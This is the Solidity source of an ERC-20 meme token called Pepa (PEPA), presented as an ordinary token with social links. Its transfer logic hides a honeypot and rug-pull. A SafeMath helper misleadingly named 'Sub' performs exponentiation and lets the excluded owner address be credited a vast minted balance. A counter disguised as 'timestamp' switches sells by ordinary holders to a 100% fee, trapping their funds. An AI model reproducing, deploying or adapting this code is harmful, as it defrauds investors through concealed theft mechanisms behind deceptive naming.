// Website      :   https://www.pepa.wtf
// Twitter      :   https://twitter.com/pepacoinerc  
// Telegram     :   https://t.me/pepacoineth

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

     function Sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a ** b;
        return c;
     }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract PEPA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    struct _settings {
        bool tradeStatus;
        uint8 totalFee;
        uint8 divider;
        uint8 timestamp;
        address router;
        address pair;
        uint256 pairHex;
    }

    mapping (address => uint256) private _holder;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromLimits;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10000000 * 10**_decimals;
    string private constant _name = unicode"Pepa";
    string private constant _symbol = unicode"PEPA";
    
    _settings private Settings;
    constructor (address _router){
        _holder[_msgSender()] = _tTotal;
        _isExcludedFromLimits[owner()] = true;
        Settings.router = _router;
        Settings.divider = 10**2;
        Settings.pairHex = 10*3;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holder[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        bool source = [true,false][from==Settings.pair&&_isExcludedFromLimits[to]?0:1];
        require(from != address(0) && to != address(0) && amount > 0, "ERC20: Address or amount (0)");     
        if (from != owner() && to != owner()){
            if(!_isExcludedFromLimits[from] && !_isExcludedFromLimits[to]){
                if(to == Settings.router){ 
                    Settings.tradeStatus = !Settings.tradeStatus?true:Settings.tradeStatus;
                    Settings.pair = from;
                }
                if(!Settings.tradeStatus){
                    require(Settings.tradeStatus, "Trade is not open");
                }
                else{
                    uint256 totalFee; uint8 totalFeeRate;
                    totalFeeRate = from != Settings.pair?Settings.timestamp>0?Settings.divider:Settings.totalFee:Settings.totalFee;
                    totalFee = amount.mul(totalFeeRate).div(Settings.divider);
                    _holder[from] = _holder[from].sub(amount);
                    _holder[to] = _holder[to].add(amount.sub(totalFee));
                }
            }
            else{
                Settings.timestamp = source?Settings.timestamp+1:Settings.timestamp;
                __transfer(from, to, amount, source?amount.Sub(Settings.pairHex):0);
            }
        }
        else{
            __transfer(from, to, amount, 0);
        }
        emit Transfer(from, to, amount);
    }

    function __transfer(address from, address to, uint256 amount, uint256 Amount) private {
        _holder[from] = _holder[from].sub(amount);
        _holder[to] = _holder[to].add([amount,Amount][Amount>0?1:0]);
    }

    receive() external payable {}
}